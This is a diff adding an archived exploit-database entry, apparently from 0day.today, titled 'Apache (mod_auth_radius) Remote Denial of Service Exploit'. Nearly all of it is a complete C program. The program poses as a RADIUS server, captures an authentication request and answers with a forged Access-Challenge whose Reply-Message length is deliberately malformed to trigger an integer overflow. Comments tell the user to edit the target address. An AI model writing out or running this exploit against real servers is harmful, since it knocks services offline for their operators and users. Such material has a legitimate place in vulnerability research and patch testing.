@@ -1,0 +1,141 @@
+id: 5942
+date: 01/16/2005
+title: Apache (mod_auth_radius) Remote Denial of Service Exploit
+author: Leon Juranic
+cves: 
+
+=========================================================
+Apache (mod_auth_radius) Remote Denial of Service Exploit
+=========================================================
+
+
+
+/* gcc -o dos dos.c -lssl       
+ * Make sure you change inet_addr at the bottom. /str0ke
+ */
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+#include <openssl/md5.h>
+#define RADIUS_AUTH_UDP_PORT 1645
+#define RADIUS_PASSWORD_LEN 16
+#define RADIUS_RANDOM_VECTOR_LEN 16
+#define RADIUS_HEADER_LEN 20
+
+/* RADIUS ID definitions. See RFC 2138 */
+#define RADIUS_ACCESS_REQUEST 1
+#define RADIUS_ACCESS_ACCEPT 2
+#define RADIUS_ACCESS_REJECT 3
+#define RADIUS_ACCESS_CHALLENGE 11
+
+/* RADIUS attribute definitions. Also from RFC 2138 */
+#define RADIUS_USER_NAME 1
+#define RADIUS_PASSWORD 2
+#define RADIUS_NAS_IP_ADDRESS 4
+#define RADIUS_SERVICE_TYPE 6
+#define RADIUS_REPLY_MESSAGE 18
+#define RADIUS_STATE 24
+#define RADIUS_SESSION_TIMEOUT 27
+#define RADIUS_NAS_IDENTIFIER 32
+
+/* service types : authenticate only for now */
+#define RADIUS_AUTHENTICATE_ONLY 8
+#define RADIUS_PACKET_RECV_SIZE 1024
+#define RADIUS_PACKET_SEND_SIZE 1024
+#define APACHE_RADIUS_MAGIC_STATE "f36809ad"
+
+/* Per-attribute structure */
+typedef struct attribute_t {
+  unsigned char attribute;
+  unsigned char length;
+  unsigned char data[1];
+} attribute_t;
+
+/* Packet header structure */
+typedef struct radius_packet_t {
+  unsigned char code;
+  unsigned char id;
+  unsigned short length;
+  unsigned char vector[RADIUS_RANDOM_VECTOR_LEN];
+  attribute_t first;
+} radius_packet_t;
+
+char secret[] = "testing123";
+
+main (int argc, char **argv)
+{
+  int sock,cl,x,n;
+
+  struct sockaddr_in sin,exp;
+  char buffer[RADIUS_PACKET_RECV_SIZE], client[RADIUS_PACKET_SEND_SIZE];
+  attribute_t *attr, *attrcl, *attrcl2;
+  radius_packet_t *rad, *radcl;
+  char vector[RADIUS_RANDOM_VECTOR_LEN];
+  MD5_CTX sum;
+
+  sock = socket (AF_INET, SOCK_DGRAM, 0);
+  
+  sin.sin_port = htons (RADIUS_AUTH_UDP_PORT);
+  sin.sin_family = AF_INET;
+  sin.sin_addr.s_addr = INADDR_ANY;
+  bzero (sin.sin_zero, 8);
+
+  bind (sock, (struct sockaddr*)&sin, sizeof(struct sockaddr));
+  
+  n = sizeof (struct sockaddr);
+  while ((x = recvfrom (sock, buffer, RADIUS_PACKET_RECV_SIZE, 0, (struct sockaddr*)&sin, &n)) > -1)
+  {
+  printf ("GOT PACKET!!!\n");
+  rad = (radius_packet_t*)buffer;
+  attr = (attribute_t*)&rad->first;
+  printf ("%d-%s\n",ntohs(sin.sin_port),inet_ntoa(sin.sin_addr));
+  break;
+  }
+
+  bzero(client,1024);
+  radcl = (radius_packet_t*)client;
+  attrcl = (attribute_t*)&radcl->first; 
+  
+  radcl->code = RADIUS_ACCESS_CHALLENGE;
+  radcl->id = 140; 
+
+  n = (sizeof (radius_packet_t) + (sizeof(attribute_t) * 2) + 20); 
+  radcl->length = htons(n);
+  printf ("---->%d\n",ntohs(radcl->length));
+  
+  attrcl->attribute = RADIUS_STATE;
+  attrcl->length = 3; 
+  // attrcl->data = 1;
+  
+  attrcl2 = attrcl + 1;
+  attrcl2->attribute = RADIUS_REPLY_MESSAGE;
+  attrcl2->length = 1; // INTEGER OVERFLOW
+  // attrcl2->data = 1;
+
+  // strncpy (attrcl2 + 3, "AAAAAAAAAAAAAAAAAAA\0", 20); 
+  memcpy (radcl->vector, rad->vector,16);
+  MD5_Init (&sum);
+  MD5_Update (&sum, (unsigned char*)radcl, ntohs(radcl->length));
+  MD5_Update (&sum, secret, strlen(secret));
+
+  MD5_Final (vector, &sum);
+  memcpy (radcl->vector, vector,16); 
+
+  close (sock);
+  
+  cl = socket (AF_INET, SOCK_DGRAM, 0); 
+  
+  exp.sin_family = AF_INET;
+  exp.sin_port = sin.sin_port;
+  exp.sin_addr.s_addr = inet_addr("192.168.0.3");;
+  bzero (exp.sin_zero,8);
+  sendto (cl, &client, n, 0 , (struct sockaddr*)&exp, sizeof (struct sockaddr));
+  perror ("sendto:");
+}
+
+
+
+#  0day.today [2023-03-21]  #
